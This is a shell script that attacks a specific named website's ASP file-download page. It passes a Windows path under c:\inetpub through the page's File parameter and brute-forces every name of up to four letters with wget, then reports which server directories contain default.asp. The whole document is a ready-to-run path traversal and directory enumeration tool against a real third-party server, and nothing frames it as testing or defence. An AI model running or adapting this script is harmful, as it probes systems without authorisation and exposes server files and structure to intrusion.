#!/bin/sh

URL="https://www.sonicats.com/cejobs/DownloadDiavik.asp?Name=Test&Filename=Test&File=c%3A%2finetpub%2f"

if [ -f ./names.txt ]; then
	echo "names.txt exists.  Using current file..."
else
	echo "Generating name list..."
	
	for x1 in {a..z}
	do
		for x2 in ' ' {a..z}
		do
			for x3 in ' ' {a..z}
			do
				for x4 in ' ' {a..z}
				do
					TESTNAME=`echo "$x1$x2$x3$x4"`
					echo "$TESTNAME" >> ./names.txt
				done
			done
		done
	done
fi

UNIQUENAMES=`cat names.txt | sed "s| ||g" | sort -u`

echo "[`date`] Running scan..."
for DIRNAME in $UNIQUENAMES
do
	FULLURL=`echo "$URL""$DIRNAME""%2fdefault.asp"`
	RESULT=`wget --no-check-certificate -O - "$FULLURL"`

	NUMLINES=`echo $RESULT | wc -l`

	if [ $NUMLINES -gt 0 ]; then
		FILENOTFOUND=`echo $RESULT | grep "File was not found" | wc -l`

		if [ $FILENOTFOUND -eq 0 ]; then
			echo "Found dir: c:\inetpub\$DIRNAME\default.asp"
		fi
	fi
done

echo "[`date`] Scan completed."
